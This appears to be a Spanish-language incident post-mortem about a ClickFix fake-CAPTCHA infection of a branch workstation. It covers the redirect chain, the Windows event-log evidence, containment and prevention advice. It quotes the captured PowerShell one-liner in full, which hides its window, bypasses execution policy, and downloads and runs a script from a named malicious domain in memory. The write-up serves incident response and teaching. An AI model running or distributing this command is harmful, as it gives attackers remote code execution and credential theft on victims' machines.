# 🚨 Post-Mortem: Incidente de Seguridad en Estación de Trabajo (Ejecución Fileless vía FakeCAPTCHA)

> **Nota:** Este documento resume un caso real de respuesta a incidentes en el que participé. Los datos sensibles han sido anonimizados o adaptados para proteger la confidencialidad de la organización.

## 📄 Resumen Ejecutivo

Durante una conexión remota de soporte rutinaria, se detectó la ejecución no autorizada de un comando de PowerShell diseñado para realizar una descarga y ejecución en memoria (*fileless execution*) de un payload malicioso, evadiendo las políticas de ejecución locales. El ataque se originó a través de ingeniería social utilizando la táctica de **FakeCAPTCHA (ClickFix)**.

---

## 🔍 Datos del Incidente

* **Fecha y Hora de Ejecución (Local):** 08/08/2026 a las 11:15:19 a. m.
* **Fecha y Hora (UTC):** `2026-08-08T15:15:19.9377216Z`
* **Fecha y Hora de Detección:** 12/08/2026 a las 12:55 p. m.
* **Equipo Afectado:** `SUCURSAL-CAJA01.CORP.LAN` (Estación de trabajo / Caja 2 - Sucursal [Anonimizada])
* **Personal Involucrado (TI/Seguridad):** Héctor Yépez, Daniel Jiménez

---

## ⏱️ Cronología y Vector de Ataque

Tras una auditoría del historial de navegación y correlación con los registros de eventos de Windows, se reconstruyó la siguiente línea temporal:

* **11:06 AM - Navegación no corporativa:** Acceso a sitios de descargas de medios no oficiales (`compucalitv.lol`).
* **11:06 AM - 11:13 AM - Redirección maliciosa:** Salto a través de redes de malvertising y acortadores (`link.compucalitv.lol`, `kettledroopingcontinuation.com`, `jclink.io`).
* **11:14 AM - Descarga previa:** Conexión con el dominio malicioso `jcei.wrestpopdownloadnow.monster`.
* **11:15 AM - Vector de entrada (FakeCAPTCHA / ClickFix):** La página web engañó al usuario para copiar y ejecutar código malicioso mediante la ventana Ejecutar (`Win + R`), simulando un proceso de verificación de seguridad (CAPTCHA falso).
* **11:15:19 AM - Ejecución registrada:** Inicio de PowerShell con bypass de directivas y descarga del script remoto.

---

## 🛡️ Evidencia Forense y Análisis Técnico

Se extrajo la evidencia desde los registros de eventos del sistema (Event Viewer).

* **ID de Evento:** 400 (Windows PowerShell)
* **EventRecordID:** `26731`
* **Comando Ejecutado (Payload):**
  ```powershell
  C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe -w 1 -ep bypass -c "$a=(irm 'jetpopdownloadsecret.monster/G7X67H2EJTjDdm5T' -UseBasicParsing);[ScriptBlock]::Create($a).InvokeReturnAsIs()"
  ```

### Análisis del Comando
El comando identificado utiliza parámetros de evasión para descargar y ejecutar un script remoto de forma silenciosa:
* `-w 1` (WindowStyle Hidden): Oculta la ventana de PowerShell para no alertar al usuario.
* `-ep bypass` (ExecutionPolicy Bypass): Ignora las políticas de ejecución locales de PowerShell.
* `irm (...)`: Alias de `Invoke-RestMethod`, descarga el contenido malicioso.
* `[ScriptBlock]::Create($a).InvokeReturnAsIs()`: Ejecuta el código descargado directamente en memoria (Fileless), dificultando su detección por antivirus tradicionales basados en firmas.

### Implicaciones en la Seguridad
La ejecución de este tipo de scripts tiene consecuencias críticas para la infraestructura de la organización:
* **Ejecución Remota de Código (RCE):** El atacante puede ejecutar instrucciones arbitrarias en el PC local.
* **Compromiso de Credenciales:** Riesgo elevado de robo de contraseñas almacenadas en navegadores o acceso a sesiones activas (Drive Master de sistemas, AnyDesk).
* **Persistencia:** Instalación de "puertas traseras" (backdoors) para mantener el acceso recurrente incluso después de reiniciar el equipo.
* **Movimiento Lateral:** Potencial riesgo de propagación hacia otros dispositivos críticos de la red (servidores locales, DVR de cámaras, otras PCs de caja).

---

## 🛠️ Medidas Tomadas y Plan de Acción

Dada la naturaleza persistente y el alto nivel de riesgo de la vulnerabilidad, se ejecutaron las siguientes acciones de contención y erradicación:

1. **Aislamiento Inmediato:** El equipo fue desconectado físicamente de la red local para evitar la propagación (movimiento lateral) hacia otros dispositivos.
2. **Saneamiento (Formateo):** Se determinó el formateo completo del disco duro y una instalación limpia del sistema operativo como la única medida eficaz para garantizar la eliminación total de la persistencia del malware.
3. **Restablecimiento de Credenciales:** Rotación y cambio obligatorio de todas las contraseñas de acceso local y remoto asociadas a dicho equipo.

---

## 💡 Recomendaciones Preventivas y Lecciones Aprendidas

Para fortalecer la postura de seguridad de la red y mitigar futuras infecciones mediante tácticas similares, se emitieron las siguientes recomendaciones al equipo de infraestructura y gerencia:

* **Auditoría en Active Directory:** Realizar un recorrido exhaustivo por las cuentas de usuario de caja en el Active Directory para validar que operen bajo el principio de menor privilegio (PoLP), asegurando que no posean permisos de administrador local.
* **Restricción de Ejecución de Comandos (GPOs):** Implementar Políticas de Grupo para restringir el acceso y ejecución de herramientas de línea de comandos (PowerShell, CMD, y la ventana de Ejecutar) para usuarios de nivel operativo.
* **Concientización y Capacitación:** Instruir a los colaboradores sobre la prohibición de uso de estaciones de trabajo operativas para fines personales y realizar campañas de concientización sobre nuevas modalidades de estafa (como el *ClickFix* o falsos CAPTCHAs).
